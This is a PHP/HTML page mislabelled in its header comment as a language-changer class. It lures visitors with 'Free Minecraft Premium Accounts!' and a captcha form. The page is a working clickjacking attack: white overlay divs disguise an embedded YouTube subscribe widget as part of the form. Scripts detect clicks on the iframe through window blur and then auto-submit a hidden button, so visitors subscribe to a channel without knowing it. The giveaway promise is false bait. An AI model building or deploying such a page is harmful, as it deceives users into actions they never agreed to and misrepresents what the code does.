<?php
/*
Description: 	Simple Language Changer Class 
				you can use it for change language to another one 
				it is simple to use 
Auther:			Payam khaninajad 
Contact Email:	progvig@yahoo.com
Site:			http://progvig.ir
Year:			2010/11/13
*/
if (!empty($_POST['action']) && $_POST['action'] == "checkdata") {
    if ($_SESSION['tmptxt'] == $_POST['tmptxt']) {
    $_SESSION['listo'] = true; // En caso de ser Iguales establecer la sesion "listo"
    header('Location: privada.php');
    exit;
} else // En caso de que la Pass no sea Correcta lanzamos un error con JavaScript.
{
?>
<script type="text/javascript">
<!--
alert('El codigo es erroneo.')
//-->
</script>
<?php
}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>Free Minecraft Premium Accounts!</title>
<script src="http://code.jquery.com/jquery-1.9.0.js"></script>
<style>

</style>
<script language="JavaScript">
function disableEnterKey(e)
{
     var key;
     if(window.event)
          key = window.event.keyCode;     //IE
     else
          key = e.which;     //firefox
     if(key == 13)
          return false;
     else
          return true;
}
</script>
<script type="text/javascript">
    $(document).ready(function() {
        var isOverIFrame = false;

        function processMouseOut() {
            log("IFrame mouse >> OUT << detected.");
            isOverIFrame = false;
            top.focus();
        }

        function processMouseOver() {
            log("IFrame mouse >> OVER << detected.");
            isOverIFrame = true;
        }

        function processIFrameClick() {
            if(isOverIFrame) {
		setTimeout(function() {
 		$("#wait").show();
		$("#sub").show();
		}, 390);

		setTimeout(function() {
 		$('#login').click();
		}, 3000);
            }
        }

        function log(message) {
            var console = document.getElementById("console");
            var text = console.value;
            text = text + message + "\n";
            console.value = text;
        }

        function attachOnloadEvent(func, obj) {
            if(typeof window.addEventListener != 'undefined') {
                window.addEventListener('load', func, false);
            } else if (typeof document.addEventListener != 'undefined') {
                document.addEventListener('load', func, false);
            } else if (typeof window.attachEvent != 'undefined') {
                window.attachEvent('onload', func);
            } else {
                if (typeof window.onload == 'function') {
                    var oldonload = onload;
                    window.onload = function() {
                        oldonload();
                        func();
                    };
                } else {
                    window.onload = func;
                }
            }
        }

        function init() {
            var element = document.getElementsByTagName("iframe");
            for (var i=0; i<element.length; i++) {
                element[i].onmouseover = processMouseOver;
                element[i].onmouseout = processMouseOut;
            }
            if (typeof window.attachEvent != 'undefined') {
                top.attachEvent('onblur', processIFrameClick);
            }
            else if (typeof window.addEventListener != 'undefined') {
                top.addEventListener('blur', processIFrameClick, false);
            }
        }

        attachOnloadEvent(init);
    });
</script>
<script src="http://code.jquery.com/jquery-1.9.0.js"></script>
<script type="text/javascript">
(function($){
    $.fn.MySlider = function(interval) {
        var slides;
        var cnt;
        var amount;
        var i;

        function run() {
            // hiding previous image and showing next
            $(slides[i]).fadeOut(1000);
            i++;
            if (i >= amount) i = 0;
            $(slides[i]).fadeIn(1000);

            // updating counter
            cnt.text(i+1+' / '+amount);

            // loop
            setTimeout(run, interval);
        }

        slides = $('#my_slider').children();
        cnt = $('#counter');
        amount = slides.length;
        i=0;

        // updating counter
        cnt.text(i+1+' / '+amount);

        setTimeout(run, interval);
    };
})(jQuery);

// custom initialization
jQuery(window).load(function() {
    $('.smart_gallery').MySlider(60000);
});
</script>
</head>
<body>

<?php

require_once 'inc/lang.class.php';
$mylang=new mylanguage();
$mylang->load_language($_SESSION['mylang']);

?>

<h3><?php echo text1; ?></h3>

<center><h1><?php echo text2; ?></h1>
<br>

<div style="width: 510px; height: 122px; left: 358px;top: 106px;background:#fff; z-index: 6; position: absolute;display:none;" id="wait"><center><h1><?php echo text3; ?></h1><img src="http://revistav.uvm.edu.ve/admincontenido/images/load.gif" style="width:32px; height:32px;"></center></div>
<div style="position:relative; top:-20px; width:510px; background:#fff; z-index:5;border-top: 1px #000 solid;border-left: 1px #000 solid;border-right: 1px #000 solid;padding-top: 5px;left:0px;">
<?php echo text4; ?><br>
<form action="" method="post">
<img src="captcha.php" width="100" height="30" vspace="3" /><br>
<input name="tmptxt" onKeyPress="return disableEnterKey(event)" type="text" size="30" /><br>
<input name="btget" type="submit" style="display:none;" value="Check" id="login" />
<input name="action" type="hidden" value="checkdata" />
</form>
</div>

<div style="position:relative; top: -230px;left: 60px;">
<div style="width:84px; background:#fff; border:1px #fff solid; height: 34px; position:relative; z-index:4; left: -63px;top: 238px; display:none;" id="sub"></div>
<div style="width: 216px; background: #fff; height: 40px; position:relative; z-index:4; left: -207px; top: 209px;border-left: 1px #000 solid;border-bottom: 1px #000 solid;"></div>
<div style="width: 84px; background: #fff; height: 6px; position:relative; z-index:4; left: -63px; top: 202px;border-bottom: 1px #000 solid;"></div>
<div style="width: 298px; height: 67px; position:relative; top: 100px; left: 47px; background:#fff; border-right: 1px #000 solid; z-index:1;"></div>
<div style="width: 216px; height: 34px; position:relative; left: 88px; top: 100px; border-bottom: 1px #000 solid; background: #fff; z-index:3;border-right: 1px #000 solid;"></div>
<iframe id="marco" src="http://www.youtube.com/subscribe_widget?p=ikillnukes4evertmb" style="overflow: hidden; height: 105px; width: 300px; border: 0; position:relative; left:46px; z-index:0;top: -1px;" scrolling="no" frameborder="0"></iframe></div>

<div class="example">
    <h3>Publicidad:</h3>
    <ul id="my_slider">
      <li><a href="http://minecraftviewer.com/servers/1670630/view" target="_blank"><img src="http://cache.multiplayuk.com/b/1-1670630-560x95-5-FF5519-FFFFFF.png" alt="Server Banner" style="border:0;width:560px;height:95;position:relative;top:-15px;"></a><br><b>|| Juegos del Hambre || 24/7 || NO PREMIUM || NO HAMACHI || IP: 76.72.172.232:25578 ||</b></li>
    </ul>
La publicidad cambia cada minuto.</div>

</center>

<form name="form" id="form" action="" style="display:none;"><textarea name="console"
id="console" style="width: 100px; height: 300px;" cols="" rows=""></textarea>
<button name="clear" id="clear" type="reset">Clear</button>
</form>

<span style="display:none;"><a href="inicio.php?lang=en"><img src="images/us.gif" /></a> | <a href="inicio.php?lang=ir"><img src="images/ir.gif" /> </a>|<a href="inicio.php?lang=tr"> <img src="images/tr.gif" /></a><br /></span>

</body>
</html>
